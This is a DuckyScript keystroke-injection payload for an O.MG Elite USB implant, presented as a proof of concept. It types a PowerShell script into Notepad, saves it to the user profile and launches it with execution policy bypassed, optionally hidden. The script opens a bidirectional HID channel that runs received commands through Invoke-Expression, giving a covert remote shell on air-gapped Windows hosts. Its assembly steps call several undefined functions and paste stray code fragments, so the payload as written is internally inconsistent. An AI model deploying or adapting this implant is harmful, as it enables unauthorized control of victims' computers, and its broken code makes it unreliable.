REM       HIDX_Stealth_Link_Remote_Access_PoC_Airgapped
REM       Version 2.1
REM       OS: Windows
REM       Author: 0i41E
REM       Requirements: Firmware Version 3.0 minimum, Universal Python Listener, Activated HIDX

REM       HID based remote shell, saved into a file on disk and executed via Powershell.

REM Define Language Below
DUCKY_LANG us

REM Name of the saved PowerShell script
DEFINE #FILENAME win-hidshell.ps1
REM PowerShell WindowStyle - Normal,Minimized,Maximized or Hidden
DEFINE #WINDOWSTYLE Normal
REM USB Identifiers
DEFINE #Vendor_ID D3C0
DEFINE #Product_ID D34D

REM Description of the PoC
FUNCTION Description()
STRINGLN_BLOCK
<#
.DESCRIPTION
win-hidshell.ps1
Required Dependencies: Activated HIDX on OMG Elite device

This is a POC.
This powershell script is a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device.

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.PARAMETER Verbose
Display more information about received and executed commands

.EXAMPLE
HIDXShell usage with defined device: 
HIDXShell -VendorID D3C0 -ProductID D34D

#Credits to Rogan for idea of filehandle and device identification
#>
END_STRINGLN
END_FUNCTION

REM Delete old PoC file, and start notepad to write the new one
FUNCTION Clean_Start(#VAR1)
DELAY 1000
GUI r
DELAY 1000
STRINGLN powershell
DELAY 1000
STRINGLN Remove-Item $env:USERPROFILE\#VAR1
DELAY 250
STRINGLN notepad.exe;exit
DELAY 2000
END_FUNCTION

REM Save PoC on disk in Userprofile folder
FUNCTION Save_Payload(#VAR4)
DELAY 2000
CTRL w
DELAY 2000
ENTER
DELAY 2000
STRING %USERPROFILE%\#VAR4
DELAY 2000
ENTER
END_FUNCTION

REM Start a PowerShell with given WindowStyle and execute the PoC
FUNCTION HIDshell_Execution(#VAR5, #VAR6)
DELAY 1000
GUI r
DELAY 500
STRINGLN powershell -WindowStyle #VAR6 -ep bypass 
DELAY 1000
STRINGLN Import-Module $env:USERPROFILE\#VAR5;HIDXShell
END_FUNCTION

REM Define the Device via VID/PID
FUNCTION Device_Definition(#VAR2, #VAR3)
STRINGLN_BLOCK
 #win-hidshell.ps1
#Required Dependencies: Activated HIDX on OMG Elite device
#Recommended Listener: stealthlink-client-universal.py


function HIDXShell {
<#
.DESCRIPTION
This powershell script acts as a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device, which acts as a bridge between Listener and USB-Host.

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.PARAMETER Verbose
Display more information about received and executed commands

.EXAMPLE
HIDXShell usage with defined device: 
HIDXShell -VendorID D3C0 -ProductID D34D
#>

    [cmdletbinding()]
    param(
    [Parameter(Position = 1)]
            [ValidateNotNullOrEmpty()]
            [String]
            $VendorID = "D3C0", #Default value

        [Parameter(Position = 2)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ProductID = "D34D" # Default value
            )

    #Defining OMG device
    $OMG = $VendorID +"&PID_" + $ProductID

    $tries = 0 
    $ErrorActionPreference="Stop"

    #Creating filehandle - Method by rogandawes
    function CreateBinding(){
        try { 
                Add-Type -TypeDefinition @"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace omg {
    public class hidx {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);

        public static FileStream open(string fn) {
            return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 3, true);
        }
    }
}
"@
                Write-Host -ForegroundColor Yellow "[?]Adding Binding..."
                } 
                catch {
                    Write-Host -ForegroundColor red "[!]Error:Cannot load Binding..."
                }
        }

    #Identify OMG device
    function Get-OMGDevice(){
        $devs = gwmi Win32_USBControllerDevice
        write-host -ForegroundColor Yellow "[?]Searching for O.MG Device..."
        $devicestring=$null
        foreach ($dev in $devs) {
            $wmidev = [wmi]$dev.Dependent
            if ($wmidev.GetPropertyValue('DeviceID') -match ($OMG) -and ($null -eq $wmidev.GetPropertyValue('Service'))) {
                $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}') #GUID_DEVINTERFACE_HID
            }
        }
        return $devicestring
    }

    #Split and Write message to filehandle
    Function Send-Message(){
        #Convert output to bytes
        $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "> ") #Sending fake prompt to mimic a proper shell
        $outputLength = $outputBytes.Length
        #Send output bytes to omg
        $outputChunkSize = 8 # Kept at 8 for best experience
        $outputChunkNr = [Math]::Ceiling($outputLength / $outputChunkSize)

        #Verbosity message
        if ($VerbosePreference -eq 'Continue') {
            Write-Host -ForegroundColor green "[+]Output of $($outputLength) bytes ready to send in $($outputChunkNr) packets."
        }

        $messageSendTime = Get-Date
        for ($i = 0; $i -lt $outputChunkNr; $i++) {
            $outputBytesToSend = New-Object Byte[] (65)
            $outputStart = $i * $outputChunkSize
            $outputEnd = [Math]::Min(($i + 1) * $outputChunkSize, $outputLength)
            $outputChunkLen = $outputEnd - $outputStart
            [System.Buffer]::BlockCopy($outputBytes, $outputStart, $outputBytesToSend, 1, $outputChunkLen) # Copy the chunk to the packet
            if ($VerbosePreference -eq 'Continue') {
                $currentTime = Get-Date
                $timeDifference = $currentTime - $messageSendTime
                Write-Host -ForegroundColor yellow "[?]Message ready to send after $($timeDifference)..."
                $messageSendTime=$currentTime
                $outputBytesToSend | Format-Hex
            }
            $filehandle.Write($outputBytesToSend, 0, 65)

        }
    }
    
    
    CreateBinding
    #Find O.MG device
    $devicestring = Get-OMGDevice
    #Verify device - error checking
    if($null -eq $devicestring){
        $loop=$false
        Write-Host -ForegroundColor red "[!]Error: No O.MG Device not found! Check VID/PID"
        $loop=$false
        break
    }
    #Verify device - open device
    Write-Host -ForegroundColor Green "[+]Identified O.MG Device: ${devicestring}"
    $filehandle = [omg.hidx]::open($devicestring)
    #Verify filehandle 
    if($null -eq $filehandle){
        $loop=$false
        Write-Host -ForegroundColor red "[!]Error: Filehandle is empty"
        break
    }
    

    #Message on initial connection
    $output = "[+]Stealth Link Session Established!`n"
                
    #Sending message on initial connection
    Write-Host -ForegroundColor Cyan "[*]Sending Connection Prompt to ${devicestring}"
    Send-Message

    #Starting loop for birectional connection
    $loop=$true
    while ($loop) {
        try {
                #Find O.MG device
                $devicestring = Get-OMGDevice
                #Verify device - error checking
                if($null -eq $devicestring){
                    $loop=$false
                    Write-Host -ForegroundColor red "[!]Error: No O.MG Device not found! Check VID/PID"
                    $loop=$false
                    break
                }
                #Verify device - open device
                Write-Host -ForegroundColor Green "[+]Connected O.MG Device: ${devicestring}"
                $filehandle = [omg.hidx]::open($devicestring)
                #Verify filehandle 
                if($null -eq $filehandle){
                    $loop=$false
                    Write-Host -ForegroundColor red "[!]Error: Filehandle is empty"
                    break
                }
                $in = ""
                Do {
                    Write-Host -ForegroundColor Green "[+]Ready to receive commands..."
                    echo $filehandle.Length
                    echo $filehandle.BytesToRead
                    $byte = [byte[]]::new(10)
                    #Read bytes from omg
                    $bytes = New-Object Byte[] (65)
                    $filehandle.Read($bytes, 0, 65) | Out-Null
                    #Split and display received command
                    foreach ($byte in $bytes) {
                        $input_raw = [System.Convert]::ToChar($byte)
                        if (($input_raw -ge 32 -and $input_raw -le 126) -or $input_raw -eq 10) {
                            $in = "${in}${input_raw}"
                            #If using verbose, display split commands
                            if ($VerbosePreference -eq 'Continue') {
                            Write-Host "Command Parts: ${byte} / $in"
                            }

                        }
                    }
                } While (!$in.Contains("`n")) #Execute on new-line
                Try {
                    if ($VerbosePreference -eq 'Continue') {
                        Write-Host -ForegroundColor Green "[+]Executed command: $in"
                        $in | Format-Hex
                    }
                    $output = Invoke-Expression $in|Out-String
                    #If output is empty return fake prompt
                    if ($output -eq '') {
                        if ($VerbosePreference -eq 'Continue') {
                            $output = "[+]Command successful!`n" #If verbose is set, return additional message
                        } else {
                            $output = "`n"
                        }
                    }

                } Catch {
                    $output = Echo "[!]Error: The command was not recognized as the name of a cmdlet, a function, a script file or an executable program."|Out-String #Error message send to receiver
                    Write-Host -ForegroundColor red "[!]Error: Unable to run: $in" #Error message in console
                }

            #Sending Message to OMG Device
            Send-Message

            $filehandle.Close()
        }
        catch {
            if ($VerbosePreference -eq 'Continue') {
                Write-Host -ForegroundColor red "[!]Error occurred, ${tries} remain"
            }
            echo $Error
            if($tries -le 0){
                Write-Host -ForegroundColor red "[!]Fatal error, tries exhausted must stop"
                $loop=$false
                $filehandle.Close()
                break
            } else {
                $tries = $tries - 1
            }
        }
    }
}   
END_STRINGLN
END_FUNCTION

Clean_Start(#FILENAME)
DELAY 1000
STRINGLN function HIDXShell {
Description()
Device_Definition(#Vendor_ID, #Product_ID)
Create_Filehandle()
REM Console Messages
STRINGLN_BLOCK
                Write-Host -ForegroundColor Yellow "[?]Adding Binding..."
                } 
                catch {
                    Write-Host -ForegroundColor red "[!]Error:Cannot load Binding..."
                }
        }
END_STRINGLN
Get_OMGDevice()
Command_Handling()
Save_Payload(#FILENAME)
HIDshell_Execution(#FILENAME, #WINDOWSTYLE)